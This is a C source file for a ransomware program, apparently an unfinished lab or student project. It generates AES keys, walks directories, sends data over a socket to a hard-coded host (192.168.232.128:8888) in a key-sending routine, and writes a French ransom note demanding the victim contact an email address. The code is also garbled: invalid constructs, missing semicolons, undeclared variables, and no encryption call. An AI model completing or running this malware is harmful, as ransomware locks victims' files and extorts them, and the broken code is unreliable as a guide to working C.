#include "ransomlib.h"
#include <dirent.h>
#include <stdio.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <string.h>
// for isFile()
#include <sys/types.h> //isFile()
#include <errno.h>
//ransomlib.h rewrite
#define SIZEKEY AES_256_KEY_SIZE
#define SIZEIV AES_BLOCK_SIZE

void usage();
int is_encrypted(char *filename);
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
int isFile(const char* name);
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int send_key(char *pKey, char *pIv);

void usage(void){
    printf(
            "\nUsage:\n"
            " ./ransom <path> [e|d] <key in hex if decrypt>"
            );
    printf(
            "\nOptions:\n"
            "-e    Encrypt input and store results to output\n"
            "-d    Decrypt input and store results to output\n"
            "-h    Print this message\n"
            "-k    Followed by Key\n"
            "-v    Followed by Vector\n\n"
            "-h    Print this message\n"

            );
}

int is_encrypted(char *filename){
    char buffer_filename[strlen(filename)];

    strcpy(buffer_filename, filename);
    char *token = strtok(buffer_filename, ".");

    while(token != NULL){
        if(strcmp(token, "encrypt") == 0){
            return 1;
        }
        token = strtok(NULL, ".");
    }
    return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){

    directeur(*name){
        struct dirent *dir;
        // opendir() renvoie un pointeur de type DIR.
        DIR *d = opendir(".");
        if (d)
        {
            while ((dir = readdir(d)) != NULL)
            {
                printf("%s\n", dir->d_name);
                if(isFile(dir->d_name)==0)
                {
                    directeur(dir->d_name);
                }
            }
            closedir(d);
        }
    }
}

int isFile(const char* name)
{
    DIR* directory = opendir(name);

    if(directory != NULL)
    {
        closedir(directory);
        return 0;
    }
    if(errno == ENOTDIR)
    {
        return 1;
    }
    return -1;
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
    if(RAND_bytes(key, sizeKey) == 0) {
        test(key,sizeKey);
    }
    if(RAND_bytes(iv, sizeIv) == 0) {
        test(iv, sizeIv);
    }
    bytes_to_hexa(key, pKey, sizeKey);
    bytes_to_hexa(iv, pIv, sizeIv);
}

int send_key(char *pKey, char *pIv)
{
    //Create Socket
    int sockid;
    int server_port = 8888;
    char *server_ip = "192.168.232.128";

    sockid = socket(AF_INET,SOCK_STREAM,0);

    struct sockaddr_in server_addr,
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    //Message
    char *msg = "hello";

    connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));

    send(sockid, (const char *)msg, strlen(msg),0)

    //Delete Message
    memset(msg, 0, sizeof(char));
    memset(pKey, 0, sizeof(char));
    memset(pIv, 0, sizeof(char));

    close(sockid);

}

int main (int argc, char * argv[])
{

    key = (unsigned char*)calloc(SIZEKEY+1,sizeof(unsigned char));
    iv = (unsigned char*)calloc(SIZEIV+1,sizeof(unsigned char));
    pKey = (char*)calloc((SIZEKEY*2)+1,sizeof(unsigned char));
    pIv = (char*)calloc((SIZEIV*2)+1,sizeof(unsigned char));


    //Get Arguments
    if (argc > 1) {

    }
    generate_key(key,SIZEKEY,iv,SIZEIV,pKey,pIv);
    //Free memory

        //Ransom Letter
        FILE* fichier = NULL;

        fichier = fopen("ransom.txt", "w");

        if (fichier != NULL)
        {
            fputs("Votre Ordinateur a été intercepté et mis sous quarantaine\nVeuillez nous contacter à l'adresse suivante pour que l'on vous débloque l'accès à votre machine:\n getpowned@yahoo.fr", fichier);
            fclose(fichier);
        }

        return 0;
    }

}


